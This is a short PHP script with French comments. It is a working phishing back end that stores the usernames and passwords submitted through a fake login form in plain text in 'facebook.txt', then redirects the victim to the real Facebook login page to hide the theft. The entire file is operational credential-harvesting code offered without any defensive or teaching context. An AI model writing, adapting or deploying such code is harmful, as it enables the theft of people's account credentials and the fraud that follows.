<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Enregistrer les informations dans un fichier texte
    $file = @fopen("facebook.txt", "a");
    if ($file) {
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);

        // Rediriger l'utilisateur vers la vraie page de connexion
        header("Location: https://facebook.com/login");
        //echo "C'était une Réussite Totale";
	exit();
    } 
}

?>




